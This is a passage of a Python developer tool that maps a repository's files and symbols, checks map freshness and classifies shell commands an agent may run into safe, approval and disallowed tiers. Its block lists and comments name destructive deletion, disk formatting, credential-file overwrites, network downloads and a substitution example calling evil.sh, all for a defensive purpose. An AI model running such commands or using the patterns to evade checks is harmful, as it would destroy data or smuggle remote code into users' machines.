            "repository_file_count": len(files),
            "indexed_node_count": len(nodes),
            "indexed_edge_count": len(edges),
            "gap_count": len(gaps),
            "node_kinds": dict(sorted(kind_counts.items())),
            "edge_kinds": dict(sorted(edge_counts.items())),
            "languages": dict(sorted(language_counts.items())),
        },
        "nodes": sorted(nodes, key=lambda item: item["id"]),
        "edges": sorted(
            edges,
            key=lambda item: (
                item["kind"],
                item["from"],
                item["to"],
                item.get("line", 0),
            ),
        ),
        "coverage_gaps": sorted(
            gaps,
            key=lambda item: (item["code"], item.get("path", ""), item.get("message", "")),
        ),
    }


def project_write_path(project: Path, path: Path) -> Path:
    """Resolve a path about to be written or deleted, and refuse to leave the project.

    A repository can contain symlinks: `.app-context/runs -> ~/Documents` would
    otherwise make run bookkeeping write into, and prune old files from, a
    directory outside the project. Every write and delete goes through here.
    """
    root = project.expanduser().resolve()
    candidate = path if path.is_absolute() else root / path
    resolved = candidate.expanduser().resolve()
    try:
        resolved.relative_to(root)
    except ValueError as exc:
        raise MapError(f"refusing to write outside the project: {candidate} resolves to {resolved}") from exc
    return resolved


def _inside_project(project: Path, output: Path) -> Path:
    project = project.expanduser().resolve()
    resolved = output if output.is_absolute() else project / output
    resolved = resolved.expanduser().resolve()
    try:
        resolved.relative_to(project)
    except ValueError as exc:
        raise MapError(f"map output must stay inside project: {resolved}") from exc
    return resolved


def write_application_map(
    project: Path,
    data: dict[str, Any],
    output: Path = MAP_RELATIVE_PATH,
) -> Path:
    destination = _inside_project(project, output)
    destination.parent.mkdir(parents=True, exist_ok=True)
    handle, temporary_name = tempfile.mkstemp(
        prefix=f".{destination.name}.", suffix=".tmp", dir=destination.parent
    )
    try:
        with os.fdopen(handle, "w", encoding="utf-8") as temporary:
            json.dump(data, temporary, ensure_ascii=False, separators=(",", ":"))
            temporary.write("\n")
        os.replace(temporary_name, destination)
    except BaseException:
        try:
            os.unlink(temporary_name)
        except FileNotFoundError:
            pass
        raise
    return destination


def load_application_map(project: Path, source: Path) -> dict[str, Any]:
    map_path = _inside_project(project, source)
    if not map_path.is_file():
        raise MapError(f"application map not found: {map_path}")
    try:
        data = json.loads(map_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise MapError(f"cannot read application map: {exc}") from exc
    if not isinstance(data, dict) or data.get("schema_version") != MAP_SCHEMA_VERSION:
        raise MapError(f"application map schema_version must be {MAP_SCHEMA_VERSION}")
    if not isinstance(data.get("nodes"), list) or not isinstance(data.get("edges"), list):
        raise MapError("application map nodes and edges must be arrays")
    return data


def check_map_freshness(project: Path, map_data: dict[str, Any]) -> dict[str, Any]:
    project = project.expanduser().resolve()
    if not project.is_dir():
        return {
            "status": "unverified",
            "is_fresh": True,
            "generated_at": map_data.get("generated_at"),
            "map_commit": map_data.get("git_commit"),
            "current_commit": None,
            "stale_reasons": [],
            "added_files_count": 0,
            "added_files": [],
            "added_files_truncated": False,
            "deleted_files_count": 0,
            "deleted_files": [],
            "deleted_files_truncated": False,
            "modified_files_count": 0,
            "modified_files": [],
            "modified_files_truncated": False,
        }

    current_files, _ = repository_files(project)
    current_files_set = set(current_files)

    mapped_file_nodes = {
        node["path"]: node.get("content_sha256")
        for node in map_data.get("nodes", [])
        if node.get("kind") == "file" and node.get("path")
        and _safe_repository_path(project, node["path"])
    }
    mapped_files_set = set(mapped_file_nodes.keys())

    added_files = sorted(current_files_set - mapped_files_set)
    deleted_files = sorted(
        (mapped_files_set - current_files_set)
        | {p for p in mapped_files_set if not (project / p).exists()}
    )

    modified_files: list[str] = []
    for path_str in sorted(current_files_set & mapped_files_set):
        target_path = project / path_str
        if not target_path.exists():
            continue
        current_sha = _sha256_file(target_path)
        if current_sha and mapped_file_nodes.get(path_str) and current_sha != mapped_file_nodes.get(path_str):
            modified_files.append(path_str)

    current_commit = None
    try:
        commit_lines = git_output(project, ["rev-parse", "HEAD"])
        if commit_lines:
            current_commit = commit_lines[0]
    except Exception:
        pass

    map_commit = map_data.get("git_commit")
    stale_reasons: list[str] = []

    if added_files:
        stale_reasons.append(f"{len(added_files)} file(s) added")
    if deleted_files:
        stale_reasons.append(f"{len(deleted_files)} file(s) deleted")
    if modified_files:
        stale_reasons.append(f"{len(modified_files)} file(s) modified")
    if map_commit and current_commit and map_commit != current_commit and not (added_files or deleted_files or modified_files):
        stale_reasons.append(f"commit changed ({map_commit[:8]} -> {current_commit[:8]})")

    is_fresh = len(stale_reasons) == 0

    return {
        "status": "fresh" if is_fresh else "stale",
        "is_fresh": is_fresh,
        "generated_at": map_data.get("generated_at"),
        "map_commit": map_commit,
        "current_commit": current_commit,
        "stale_reasons": stale_reasons,
        "added_files_count": len(added_files),
        "added_files": added_files[:REPORT_PATH_LIMIT],
        "added_files_truncated": len(added_files) > REPORT_PATH_LIMIT,
        "deleted_files_count": len(deleted_files),
        "deleted_files": deleted_files[:REPORT_PATH_LIMIT],
        "deleted_files_truncated": len(deleted_files) > REPORT_PATH_LIMIT,
        "modified_files_count": len(modified_files),
        "modified_files": modified_files[:REPORT_PATH_LIMIT],
        "modified_files_truncated": len(modified_files) > REPORT_PATH_LIMIT,
    }


def refresh_application_map(
    project: Path,
    existing_map: dict[str, Any],
    changed_paths: list[str] | None = None,
) -> dict[str, Any]:
    project = project.expanduser().resolve()
    freshness = check_map_freshness(project, existing_map)

    if changed_paths is not None:
        target_changes = {p.replace("\\", "/") for p in changed_paths
                          if _safe_repository_path(project, p)}
    else:
        target_changes = (
            set(freshness["modified_files"])
            | set(freshness["added_files"])
            | set(freshness["deleted_files"])
        )

    if freshness["is_fresh"] and not target_changes:
        return existing_map

    files, inventory_source = repository_files(project)
    profile, gaps = _optional_profile(project)
    nodes: list[dict[str, Any]] = []
    edges: list[dict[str, Any]] = []
    source_texts: dict[str, str] = {}
    symbols_by_path: dict[str, list[dict[str, Any]]] = {}
    content_hash = hashlib.sha256()

    git_commit = None
    try:
        commit_lines = git_output(project, ["rev-parse", "HEAD"])
        if commit_lines:
            git_commit = commit_lines[0]
    except Exception:
        pass

    for relative in files:
        if not _safe_repository_path(project, relative):
            continue
        source_path = project / relative
        if source_path.is_symlink():
            try:
                link_target = os.readlink(source_path)
            except OSError as exc:
                gaps.append(
                    {"code": "unreadable-symlink", "path": relative, "message": str(exc)}
                )
                continue
            nodes.append(
                {
                    "id": f"file:{relative}",
                    "kind": "file",
                    "path": relative,
                    "role": "symlink",
                    "language": None,
                    "bytes": len(link_target.encode("utf-8", errors="surrogateescape")),
                    "content_sha256": hashlib.sha256(
                        link_target.encode("utf-8", errors="surrogateescape")
                    ).hexdigest(),
                    "confidence": "exact",
                    "analyzer": "generic-inventory@1",
                }
            )
            gaps.append({"code": "symlink-content-not-followed", "path": relative})
            continue

        try:
            raw = source_path.read_bytes()
        except OSError as exc:
            gaps.append({"code": "unreadable-file", "path": relative, "message": str(exc)})
            continue

        digest = hashlib.sha256(raw).hexdigest()
        content_hash.update(relative.encode("utf-8", errors="surrogateescape"))
        content_hash.update(b"\0")
        content_hash.update(digest.encode("ascii"))
        language = LANGUAGE_BY_SUFFIX.get(source_path.suffix.lower())
        role = infer_role(relative)

        nodes.append(
            {
                "id": f"file:{relative}",
                "kind": "file",
                "path": relative,
                "role": role,
                "language": language,
                "bytes": len(raw),
                "content_sha256": digest,
                "confidence": "exact",
                "analyzer": "generic-inventory@1",
            }
        )

        if role != "source" or language is None:
            continue
        if len(raw) > MAX_INDEXED_SOURCE_BYTES:
            gaps.append(
                {
                    "code": "source-too-large",
                    "path": relative,
                    "bytes": len(raw),
                }
            )
            continue
        try:
            text = raw.decode("utf-8")
        except UnicodeDecodeError:
            gaps.append({"code": "non-utf8-source", "path": relative})
            continue

        symbols = extract_symbols(text, language, relative)
        source_texts[relative] = text
        symbols_by_path[relative] = symbols
        nodes.extend(symbols)
        edges.extend(
            {
                "kind": "contains",
                "from": f"file:{relative}",
                "to": symbol["id"],
                "path": relative,
                "line": symbol["line"],
                "confidence": "exact",
                "analyzer": symbol.get("analyzer", "generic-inventory@1"),
            }
            for symbol in symbols
        )
        edges.extend(extract_imports(text, language, relative))

    file_paths = {node["path"] for node in nodes if node.get("kind") == "file"}
    edges, import_gaps = resolve_import_edges(edges, file_paths)
    gaps.extend(import_gaps)
    call_edges, call_gaps = build_call_edges(source_texts, symbols_by_path, edges)
    edges.extend(call_edges)
    gaps.extend(call_gaps)

    if profile is not None:
        for feature in profile["features"]:
            feature_id = f"feature:{feature['id']}"
            nodes.append(
                {
                    "id": feature_id,
                    "kind": "feature",
                    "name": feature["id"],
                    "confidence": "curated",
                    "analyzer": "profile-features@1",
                }
            )
            for file_node in [n for n in nodes if n["kind"] == "file"]:
                if any(
                    path_matches(file_node["path"], pattern)
                    for pattern in feature.get("triggers", [])
                ):
                    edges.append(
                        {
                            "kind": "feature-owns",
                            "from": feature_id,
                            "to": file_node["id"],
                            "confidence": "curated",
                            "analyzer": "profile-features@1",
                        }
                    )

    sorted_nodes = sorted(nodes, key=lambda item: item["id"])
    sorted_edges = sorted(
        edges,
        key=lambda item: (
            item["kind"],
            item["from"],
            item["to"],
            item.get("path", ""),
            item.get("line", 0),
        ),
    )
    sorted_gaps = sorted(
        gaps,
        key=lambda item: (
            item["code"],
            item.get("path", ""),
            item.get("message", ""),
        ),
    )

    return {
        "schema_version": MAP_SCHEMA_VERSION,
        "generator": "context-guardian@1",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "git_commit": git_commit,
        "project_content_sha256": content_hash.hexdigest(),
        "inventory_source": inventory_source,
        "summary": {
            "node_count": len(sorted_nodes),
            "edge_count": len(sorted_edges),
            "file_count": len([n for n in sorted_nodes if n["kind"] == "file"]),
            "symbol_count": len([n for n in sorted_nodes if n["kind"] == "symbol"]),
            "feature_count": len([n for n in sorted_nodes if n["kind"] == "feature"]),
            "coverage_gap_count": len(sorted_gaps),
            "refreshed_files_count": len(target_changes),
        },
        "nodes": sorted_nodes,
        "edges": sorted_edges,
        "coverage_gaps": sorted_gaps,
    }


def query_application_map(
    data: dict[str, Any], *, paths: list[str], symbols: list[str]
) -> dict[str, Any]:
    matched_ids = matching_node_ids(data, paths=paths, symbols=symbols)
    normalized_paths = {path.replace("\\", "/") for path in paths}

    related_edges = [
        edge
        for edge in data["edges"]
        if edge.get("from") in matched_ids or edge.get("to") in matched_ids
    ]
    related_ids = set(matched_ids)
    for edge in related_edges:
        related_ids.add(edge["from"])
        related_ids.add(edge["to"])
    related_nodes = [node for node in data["nodes"] if node["id"] in related_ids]

    return {
        "status": "ok",
        "schema_version": MAP_SCHEMA_VERSION,
        "query": {"paths": sorted(normalized_paths), "symbols": sorted(symbols)},
        "matched_id_count": len(matched_ids),
        "node_count": len(related_nodes),
        "nodes": related_nodes[:MAP_QUERY_LIMIT],
        "nodes_truncated": len(related_nodes) > MAP_QUERY_LIMIT,
        "edge_count": len(related_edges),
        "edges": related_edges[:MAP_QUERY_LIMIT],
        "edges_truncated": len(related_edges) > MAP_QUERY_LIMIT,
    }


def matching_node_ids(
    data: dict[str, Any], *, paths: list[str], symbols: list[str]
) -> set[str]:
    normalized_paths = {path.replace("\\", "/") for path in paths}
    lowered_symbols = {symbol.casefold() for symbol in symbols}
    matched_ids: set[str] = set()
    for node in data["nodes"]:
        if node.get("path") in normalized_paths:
            matched_ids.add(node["id"])
        if lowered_symbols and str(node.get("name", "")).casefold() in lowered_symbols:
            matched_ids.add(node["id"])
    return matched_ids


def _impact_transitions(
    edge: dict[str, Any], direction: str
) -> list[tuple[str, str, str]]:
    source = edge.get("from")
    target = edge.get("to")
    if not isinstance(source, str) or not isinstance(target, str):
        return []
    kind = edge.get("kind")
    if kind == "contains":
        return [
            (source, target, "contains"),
            (target, source, "contained-by"),
        ]
    if kind == "feature-owns":
        if direction == "dependents":
            return [(target, source, "owned-by-feature")]
        if direction == "dependencies":
            return [(source, target, "feature-contains")]
        return [
            (source, target, "feature-contains"),
            (target, source, "owned-by-feature"),
        ]
    if direction == "dependents":
        return [(target, source, f"reverse-{kind}")]
    if direction == "dependencies":
        return [(source, target, str(kind))]
    return [
        (source, target, str(kind)),
        (target, source, f"reverse-{kind}"),
    ]


def impact_application_map(
    data: dict[str, Any],
    *,
    paths: list[str],
    symbols: list[str],
    depth: int,
    direction: str,
    edge_kinds: list[str] | None,
) -> dict[str, Any]:
    if depth < 0 or depth > MAX_IMPACT_DEPTH:
        raise MapError(f"impact depth must be between 0 and {MAX_IMPACT_DEPTH}")
    if direction not in {"dependents", "dependencies", "both"}:
        raise MapError("impact direction must be dependents, dependencies, or both")
    selected_kinds = set(edge_kinds or DEFAULT_IMPACT_EDGE_KINDS)
    if not selected_kinds or any(not isinstance(kind, str) or not kind for kind in selected_kinds):
        raise MapError("impact edge kinds must be non-empty strings")

    node_by_id = {node["id"]: node for node in data["nodes"]}
    seeds = matching_node_ids(data, paths=paths, symbols=symbols)
    adjacency: dict[str, list[tuple[str, int, str]]] = {}
    for edge_index, edge in enumerate(data["edges"]):
        if edge.get("kind") not in selected_kinds:
            continue
        for source, target, relation in _impact_transitions(edge, direction):
            if source not in node_by_id or target not in node_by_id:
                continue
            adjacency.setdefault(source, []).append((target, edge_index, relation))
    for transitions in adjacency.values():
        transitions.sort(key=lambda item: (item[0], item[2], item[1]))

    hops = {seed: 0 for seed in seeds}
    reasons: dict[str, list[dict[str, Any]]] = {seed: [] for seed in seeds}
    queue = sorted(seeds)
    queue_index = 0
    used_edge_indexes: set[int] = set()
    traversal_truncated = False
    while queue_index < len(queue):
        current = queue[queue_index]
        queue_index += 1
        current_hop = hops[current]
        if current_hop >= depth:
            continue
        for target, edge_index, relation in adjacency.get(current, []):
            target_hop = current_hop + 1
            reason = {
                "from": current,
                "edge_kind": data["edges"][edge_index].get("kind"),
                "relation": relation,
            }
            if target not in hops:
                if len(hops) >= IMPACT_TRAVERSAL_LIMIT:
                    traversal_truncated = True
                    continue
                hops[target] = target_hop
                reasons[target] = [reason]
                used_edge_indexes.add(edge_index)
                queue.append(target)
            elif hops[target] == target_hop:
                if reason not in reasons[target] and len(reasons[target]) < 5:
                    reasons[target].append(reason)
                used_edge_indexes.add(edge_index)

    ordered_ids = sorted(hops, key=lambda node_id: (hops[node_id], node_id))
    impacted_nodes = [
        {
            **node_by_id[node_id],
            "impact_hop": hops[node_id],
            "impact_reasons": reasons[node_id],
            "is_seed": node_id in seeds,
        }
        for node_id in ordered_ids
    ]
    used_edges = [data["edges"][index] for index in sorted(used_edge_indexes)]
    normalized_paths = sorted({path.replace("\\", "/") for path in paths})
    return {
        "status": "ok",
        "schema_version": MAP_SCHEMA_VERSION,
        "query": {"paths": normalized_paths, "symbols": sorted(symbols)},
        "direction": direction,
        "depth": depth,
        "edge_kinds": sorted(selected_kinds),
        "seed_count": len(seeds),
        "seed_ids": sorted(seeds)[:MAP_QUERY_LIMIT],
        "seed_ids_truncated": len(seeds) > MAP_QUERY_LIMIT,
        "visited_node_count": len(impacted_nodes),
        "impacted_node_count": max(0, len(impacted_nodes) - len(seeds)),
        "depth_reached": max(hops.values(), default=0),
        "nodes": impacted_nodes[:MAP_QUERY_LIMIT],
        "nodes_truncated": len(impacted_nodes) > MAP_QUERY_LIMIT,
        "traversed_edge_count": len(used_edges),
        "edges": used_edges[:MAP_QUERY_LIMIT],
        "edges_truncated": len(used_edges) > MAP_QUERY_LIMIT,
        "traversal_truncated": traversal_truncated,
        "coverage_gap": not seeds,
    }


def path_matches(path: str, pattern: str) -> bool:
    normalized_path = path.replace("\\", "/")
    normalized_pattern = pattern.replace("\\", "/")
    return fnmatch.fnmatchcase(normalized_path, normalized_pattern)


DISALLOWED_COMMAND_PATTERNS = [
    (
        re.compile(r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\s+(/|~|\$HOME)", re.IGNORECASE),
        "Destructive file deletion (root or home directory)",
    ),
    (
        re.compile(r"\b(npm|yarn|pnpm|cargo|gem|pip|twine)\s+(publish|upload)\b", re.IGNORECASE),
        "Package repository publishing command",
    ),
    (
        re.compile(r"\bgit\s+(push\b|commit\b.*--amend\b)", re.IGNORECASE),
        "Remote repository mutation",
    ),
    (
        re.compile(r"\b(docker|podman)\s+push\b", re.IGNORECASE),
        "Container registry publishing",
    ),
    (
        re.compile(r"\b(eas\s+submit|fastlane\s+release|vercel\s+--prod|fly\s+deploy|netlify\s+deploy\s+--prod)\b", re.IGNORECASE),
        "Production deployment command",
    ),
    (
        re.compile(r"\b(mkfs|dd\s+if=|fdisk|format\s+[A-Z]:)\b", re.IGNORECASE),
        "Disk formatting / low-level block device write",
    ),
    (
        re.compile(r"\b(drop\s+(database|table|schema))\b", re.IGNORECASE),
        "Destructive database schema drop",
    ),
    (
        re.compile(r"(>\s*/etc/|>\s*~/\.(ssh|aws|gnupg)/)", re.IGNORECASE),
        "System configuration or security credential overwrite",
    ),
]

REQUIRES_APPROVAL_PATTERNS = [
    (
        re.compile(r"\b(curl|wget)\b", re.IGNORECASE),
        "Network download request",
    ),
    (
        re.compile(r"\bgit\s+(clone|pull|fetch)\b", re.IGNORECASE),
        "Remote Git network access",
    ),
    (
        re.compile(r"\b(prisma\s+migrate|alembic\s+upgrade|rails\s+db:migrate|sequelize\s+db:migrate)\b", re.IGNORECASE),
        "Database migration / schema modification",
    ),
    (
        re.compile(r"\b(kubectl|terraform|pulumi|helm)\s+(apply|destroy|up)\b", re.IGNORECASE),
        "Infrastructure resource mutation",
    ),
    (
        re.compile(r"\b(npm|yarn|pnpm)\s+(install|add)\b(?!\s+--frozen-lockfile)", re.IGNORECASE),
        "Package installation without frozen lockfile",
    ),
]

# "Safe" used to mean "a verification word appears somewhere in the segment", so
# `node deploy-test.js` or `./scripts/check-and-release.sh` were auto-runnable.
# A segment is now safe only when its executable is a recognised verification
# tool, or a package-manager script whose *name* is a verification name. The
# body of such a script is repository-defined; "safe" means "conventionally a
# check", not "proven harmless".
TEST_REASON = "Automated unit/integration test runner"
TYPECHECK_REASON = "Static typechecking verification"
LINT_REASON = "Static code linter / formatter audit"
ANALYZER_REASON = "Static security / analyzer inspection"
PACKAGE_SCRIPT_REASON = "Package script with a verification name (script body is repository-defined)"

SAFE_DIRECT_TOOLS = {
    "pytest": TEST_REASON,
    "jest": TEST_REASON,
    "vitest": TEST_REASON,
    "mocha": TEST_REASON,
    "unittest": TEST_REASON,
    "tsc": TYPECHECK_REASON,
    "mypy": TYPECHECK_REASON,
    "pyright": TYPECHECK_REASON,
    "eslint": LINT_REASON,
    "ruff": LINT_REASON,
    "flake8": LINT_REASON,
    "pylint": LINT_REASON,
    "swiftlint": LINT_REASON,
    "ktlint": LINT_REASON,
    "shellcheck": ANALYZER_REASON,
    "semgrep": ANALYZER_REASON,
    "bandit": ANALYZER_REASON,
}
CHECK_FLAG_TOOLS = {"black", "prettier", "isort", "swiftformat"}
PACKAGE_MANAGERS = ("npm", "yarn", "pnpm", "bun")
VERIFICATION_SCRIPT_NAME = re.compile(
    r"^(test|tests|lint|typecheck|type-check|types|check|tsc|verify|validate)([:._-][\w:.-]*)?$",
    re.IGNORECASE,
)
# Namespaced scripts such as `i18n:check` or `rules:test`. "audit" is not on the
# list: real projects use it both for read-only checks and for report writers
# (`*:audit` scripts that rewrite reports/), so an audit script must be vouched
# for in `commands.trusted`.
VERIFICATION_SCRIPT_PARTS = {
    "test", "tests", "lint", "typecheck", "type-check", "types", "check", "verify",
    "validate",
}
VERIFICATION_TASK_NAME = re.compile(r"^(test|lint|check|detekt)\w*$", re.IGNORECASE)
ENV_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=\S*$")


def _segment_tokens(segment: str) -> list[str] | None:
    try:
        tokens = shlex.split(segment)
    except ValueError:
        return None
    while tokens and ENV_ASSIGNMENT.match(tokens[0]):
        tokens.pop(0)
    return tokens or None


def _package_script_name(manager: str, args: list[str]) -> str | None:
    """Return the package.json script a package-manager invocation runs, if any."""
    if not args:
        return None
    sub = args[0]
    if manager == "npm":
        if sub in ("test", "t", "tst"):
            return "test"
        if sub in ("run", "run-script") and len(args) > 1:
            return args[1]
        return None
    if manager == "bun":
        return args[1] if sub == "run" and len(args) > 1 else None
    # yarn / pnpm run scripts both as `<pm> run <name>` and `<pm> <name>`.
    if sub == "run":
        return args[1] if len(args) > 1 else None
    if sub.startswith("-") or sub in PACKAGE_MANAGER_BUILTINS:
        return None
    return sub


PACKAGE_MANAGER_BUILTINS = {
    "install", "i", "add", "remove", "rm", "up", "upgrade", "update", "exec", "dlx",
    "why", "info", "workspace", "workspaces", "audit", "cache", "config", "init",
    "link", "unlink", "pack", "publish", "set", "version", "node", "bin", "global",
    "outdated", "prune", "rebuild", "store", "env", "create", "import", "patch",
}


def _safe_verification_reason(segment: str) -> str | None:
    tokens = _segment_tokens(segment)
    if not tokens:
        return None
    executable = Path(tokens[0]).name.lower()
    args = tokens[1:]
    if executable in ("npx", "bunx"):
        # `npx --no-install tsc` runs tsc; options before the package name are npx's own.
        while args and args[0].startswith("-"):
            args = args[1:]
        if not args:
            return None
        executable, args = Path(args[0]).name.lower(), args[1:]
    if executable.startswith("python") and len(args) >= 2 and args[0] == "-m":
        executable, args = args[1].lower(), args[2:]

    if executable in SAFE_DIRECT_TOOLS:
        return SAFE_DIRECT_TOOLS[executable]
    if executable in CHECK_FLAG_TOOLS and ("--check" in args or "--lint" in args):
        return LINT_REASON
    if executable in PACKAGE_MANAGERS:
        if executable == "bun" and args[:1] == ["test"]:
            return TEST_REASON
        name = _package_script_name(executable, args)
        if name and (
            VERIFICATION_SCRIPT_NAME.match(name)
            or any(part.lower() in VERIFICATION_SCRIPT_PARTS for part in name.split(":")[1:])
        ):
            return TEST_REASON if name.lower().startswith("test") else PACKAGE_SCRIPT_REASON
        return None
    if executable == "cargo" and args and (
        args[0] in ("test", "check", "clippy") or args[:2] == ["fmt", "--check"]
    ):
        return TEST_REASON if args[0] == "test" else ANALYZER_REASON
    if executable == "go" and args and args[0] in ("test", "vet"):
        return TEST_REASON if args[0] == "test" else ANALYZER_REASON
    if executable == "swift" and args[:1] == ["test"]:
        return TEST_REASON
    if executable in ("gradlew", "gradle"):
        tasks = [arg for arg in args if not arg.startswith("-")]
        if tasks and all(VERIFICATION_TASK_NAME.match(task.split(":")[-1]) for task in tasks):
            return TEST_REASON
        return None
    if executable == "make":
        targets = [arg for arg in args if not arg.startswith("-")]
        if targets and all(VERIFICATION_SCRIPT_NAME.match(target) for target in targets):
            return PACKAGE_SCRIPT_REASON
        return None
    if executable == "xcodebuild" and "test" in args and not {"archive", "-exportArchive"} & set(args):
        return TEST_REASON
    return None


def _has_option(args: list[str], *names: str) -> bool:
    return any(arg == name or arg.startswith(name + "=") for arg in args for name in names)


# A recognised checker stops being a read-only check with some options: it
# rewrites files, downloads code, or runs another program it is handed.
def _unsafe_option_reason(segment: str) -> str | None:
    tokens = _segment_tokens(segment)
    if not tokens:
        return None
    executable = Path(tokens[0]).name.lower()
    args = tokens[1:]
    if executable in ("npx", "bunx"):
        runner_options = []
        while args and args[0].startswith("-"):
            runner_options.append(args[0])
            args = args[1:]
        # Only the runner's own options, not those of the tool it starts (`tsc -p .`).
        if _has_option(runner_options, "--yes", "-y", "--package", "-p"):
            return "Package runner allowed to download and run code"
        if not args:
            return None
        executable, args = Path(args[0]).name.lower(), args[1:]
    if executable.startswith("python") and len(args) >= 2 and args[0] == "-m":
        executable, args = args[1].lower(), args[2:]

    writes = "Option that rewrites project files"
    if executable == "eslint" and _has_option(args, "--fix"):
        return writes
    if executable == "ruff" and (
        _has_option(args, "--fix", "--unsafe-fixes")
        or (args[:1] == ["format"] and not _has_option(args, "--check", "--diff"))
    ):
        return writes
    if executable in CHECK_FLAG_TOOLS and _has_option(args, "--write", "-w", "--in-place", "-i"):
        return writes
    if executable == "swiftlint" and (_has_option(args, "--fix", "--autocorrect") or args[:1] in (["fix"], ["autocorrect"])):
        return writes
    if executable == "ktlint" and _has_option(args, "-F", "--format"):
        return writes
    if executable == "semgrep" and _has_option(args, "--autofix"):
        return writes
    if executable == "cargo" and args[:1] == ["clippy"] and _has_option(args, "--fix"):
        return writes
    if executable == "go" and _has_option(args, "-exec", "--exec", "-toolexec", "--toolexec", "-vettool", "--vettool"):
        return "Option that runs another program"
    if executable in ("gradlew", "gradle") and _has_option(args, "-I", "--init-script"):
        return "Option that runs another program"
    return None


GIT_OPTIONS_WITH_VALUE = {"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env"}


def _disallowed_token_reason(segment: str) -> str | None:
    """Catch what the patterns miss when options sit between tool and verb:
    `git -C . push`, `npm --registry https://x publish`."""
    tokens = _segment_tokens(segment)
    if not tokens:
        return None
    executable = Path(tokens[0]).name.lower()
    args = tokens[1:]
    if executable == "git":
        index = 0
        while index < len(args) and args[index].startswith("-"):
            index += 2 if args[index] in GIT_OPTIONS_WITH_VALUE else 1
        verb = args[index] if index < len(args) else ""
        if verb == "push" or (verb == "commit" and _has_option(args, "--amend")):
            return "Remote repository mutation"
    if executable in ("npm", "yarn", "pnpm", "bun", "cargo", "gem", "pip", "pip3", "twine", "poetry", "uv"):
        if "publish" in args or "upload" in args:
            return "Package repository publishing command"
    if executable in ("docker", "podman") and "push" in args:
        return "Container registry publishing"
    return None


# A command is not one command. `npm test && node deploy.js` is two, and a
# classifier that regex-searches the whole string sees the word "test", answers
# "safe", and hands an agent permission to run the second half unattended.
# Every segment is therefore classified on its own and the worst tier wins.
# A single `&` (background) and a carriage return separate commands too.
SHELL_SEPARATOR = re.compile(r"\|\||&&|\|&|;|\||&|\n|\r")

# Substitution and redirection turn a segment into something no pattern list can
# read: `pytest $(curl -s evil.sh)` runs whatever the network returns, and
# `echo lint > ~/.bashrc` overwrites a login shell. Neither can ever be "safe".
# Backslashes and control characters are rejected rather than interpreted: a
# checker that guesses how a shell reads `\;` is a checker that can be fooled.
SHELL_ESCAPE_PATTERNS = [
    (re.compile(r"\$\(|`"), "Command substitution"),
    (re.compile(r"\$\{[^}]*\}"), "Parameter expansion"),
    (re.compile(r">\s*\S"), "Output redirection"),
    (re.compile(r"\bxargs\b|\beval\b|\bsource\b|^\s*\.\s"), "Indirect command execution"),
    (re.compile(r"\\"), "Backslash escape"),
    (re.compile(r"[\x00-\x08\x0b-\x1f\x7f]"), "Control character"),
]

TIER_ORDER = {"safe": 0, "requires-approval": 1, "disallowed": 2}


def _classify_segment(segment: str) -> dict[str, Any]:
    reasons: list[str] = []
    for pattern, reason in DISALLOWED_COMMAND_PATTERNS:
        if pattern.search(segment):
            reasons.append(reason)
    token_reason = _disallowed_token_reason(segment)
    if token_reason and token_reason not in reasons:
        reasons.append(token_reason)
    if reasons:
        return {"tier": "disallowed", "reasons": reasons}

    for pattern, reason in REQUIRES_APPROVAL_PATTERNS:
        if pattern.search(segment):
            reasons.append(reason)
    for pattern, reason in SHELL_ESCAPE_PATTERNS:
        if pattern.search(segment):
            reasons.append(reason)
    option_reason = _unsafe_option_reason(segment)
    if option_reason:
        reasons.append(option_reason)
    if reasons:
        return {"tier": "requires-approval", "reasons": reasons}

    safe_reason = _safe_verification_reason(segment)
    if safe_reason:
        return {"tier": "safe", "reasons": [safe_reason]}

    return {
        "tier": "requires-approval",
        "reasons": ["Unrecognized command pattern; conservative approval required"],
    }


def _scan_shell(command: str) -> tuple[list[str], bool]:
    """Split on shell operators the way a POSIX shell reads quotes.

    Inside single quotes nothing is special, not even a backslash; elsewhere a
    backslash makes the next character literal. Returns the segments and
    whether every quote was closed.
    """
    segments: list[str] = []
    current: list[str] = []
    quote: str | None = None
    index = 0
    while index < len(command):
        character = command[index]
        if quote == "'":
            current.append(character)
            if character == "'":
                quote = None
            index += 1
            continue
        if character == "\\":
            current.append(command[index:index + 2])
            index += 2
            continue
        if quote == '"':
            current.append(character)
            if character == '"':
                quote = None
            index += 1
            continue
        if character in "'\"":
            quote = character
            current.append(character)
            index += 1
            continue
        match = SHELL_SEPARATOR.match(command, index)
        if match:
            segments.append("".join(current))
            current = []
            index = match.end()
            continue
        current.append(character)
        index += 1
    segments.append("".join(current))
    return [segment.strip() for segment in segments if segment.strip()], quote is None


def split_shell_segments(command: str) -> list[str]:
    """Split on shell operators, ignoring separators inside quotes."""
    return _scan_shell(command)[0]


def requested_trusted_commands(profile: dict[str, Any] | None) -> set[str]:
    """Commands the repository *asks* to have trusted (`commands.trusted`).

    The profile lives in the repository, so anyone who can change the repository
    can write this list. It is never trust by itself: each person approves a
    command on their own machine with `context-guardian trust`.
    """
    if not isinstance(profile, dict):
        return set()
    commands = profile.get("commands")
    if not isinstance(commands, dict):
        return set()
    return {c.strip() for c in commands.get("trusted", []) if isinstance(c, str) and c.strip()}


def trust_store_path() -> Path:
    """Per-user approvals, outside every repository."""
    override = os.environ.get("CONTEXT_GUARDIAN_CONFIG_DIR")
    if override:
        base = Path(override).expanduser()
    elif os.name == "nt":
        base = Path(os.environ.get("APPDATA") or Path.home() / "AppData" / "Roaming") / "context-guardian"
    else:
        base = Path(os.environ.get("XDG_CONFIG_HOME") or Path.home() / ".config") / "context-guardian"
    return base / "trusted-commands.json"


def _load_trust_store() -> dict[str, Any]:
    try:
        data = json.loads(trust_store_path().read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {"version": 1, "projects": {}}
    if not isinstance(data, dict) or not isinstance(data.get("projects"), dict):
        return {"version": 1, "projects": {}}
    return data


def _trust_key(project: Path) -> str:
    return str(project.expanduser().resolve())


def trusted_commands(profile: dict[str, Any] | None, project: Path | None = None) -> set[str]:
    """Commands approved on this machine for this project."""
    if project is None:
        return set()
    entries = _load_trust_store()["projects"].get(_trust_key(project), [])
